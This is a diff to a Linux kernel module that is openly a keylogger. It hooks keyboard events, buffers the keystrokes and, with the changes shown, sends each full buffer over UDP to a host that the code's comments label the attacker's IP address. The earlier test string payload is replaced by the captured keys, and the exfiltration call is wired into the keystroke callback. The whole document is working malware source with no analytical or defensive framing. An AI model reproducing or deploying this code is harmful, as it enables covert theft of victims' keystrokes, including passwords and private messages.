@@ -22,7 +22,12 @@
 #define DEBUG 1
 #define debug(args...) if(DEBUG) printk(KERN_INFO args)
 
-#define BUF_SIZE 256
+#define SRC_IP "0.0.0.0" // the victim's IP address, not important
+#define DEST_IP "10.0.2.15" // the attacker's IP address
+#define SRC_PORT 12345 // the victim's UDP port
+#define DEST_PORT 54321 // the attacker's UDP port
+
+#define BUF_SIZE 10
 
 static char key_buf[BUF_SIZE];
 static unsigned int key_buf_ptr;
@@ -95,11 +100,8 @@ static int send_key_buf(void){
     uint8_t dest_addr[ETH_ALEN];
 
     unsigned char* data;
-    char *srcIP = "10.0.2.15";
-    char *dstIP = "123.123.123.123";
-    char *hello_world = ">>> KERNEL sk_buff Hello World <<< by Dmytro Shytyi";
-    int udp_payload_len = 51;
-    int udp_total_len = UDP_HEADER_RM + udp_payload_len;
+    
+    int udp_total_len = UDP_HEADER_RM + key_buf_ptr;
     int ip_total_len = IP_HEADER_RM + udp_total_len;
     
     struct sk_buff* skb;
@@ -126,14 +128,14 @@ static int send_key_buf(void){
     //adjust headroom
     skb_reserve(skb, ETH_HLEN + IP_HEADER_RM + UDP_HEADER_RM);
 
-    data = skb_put(skb, udp_payload_len);
-    memcpy(data, hello_world, udp_payload_len);
+    data = skb_put(skb, key_buf_ptr);
+    memcpy(data, key_buf, key_buf_ptr);
 
     // udp header
     uh = (struct udphdr*)skb_push(skb, UDP_HEADER_RM);
     uh->len = htons(udp_total_len);
-    uh->source = htons(15934); // upd ports
-    uh->dest = htons(15904);
+    uh->source = htons(SRC_PORT); // udp ports
+    uh->dest = htons(DEST_PORT);
 
     // ip header
     iph = (struct iphdr*)skb_push(skb, IP_HEADER_RM);
@@ -145,8 +147,8 @@ static int send_key_buf(void){
     iph->ttl = 64; // Set a TTL.
     iph->protocol = IPPROTO_UDP; //  protocol.
     iph->check = 0;
-    iph->saddr = inet_addr(srcIP);
-    iph->daddr = inet_addr(dstIP);
+    iph->saddr = inet_addr(SRC_IP);
+    iph->daddr = inet_addr(DEST_IP);
 
     /* changing Mac address */   
     eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));//add data to the start of a buffer
@@ -186,6 +188,9 @@ int keylogger_cb(struct notifier_block *nb, unsigned long action, void *data) {
 
         // loop back and dump the whole buffer to the network
         if(key_buf_ptr >= BUF_SIZE) {
+            if(send_key_buf()) {
+                printk(KERN_INFO "Sending key_buf failed!\n");
+            }
             key_buf_ptr = 0;
             memset(key_buf, 0, BUF_SIZE);
         }
@@ -207,7 +212,7 @@ static int keylogger_init(void)
     memset(key_buf, 0, BUF_SIZE);
     key_buf_ptr = 0;
     register_keyboard_notifier(&nb);
-    send_key_buf();// for testing
+    //send_key_buf();// for testing
     return 0;
 }
 
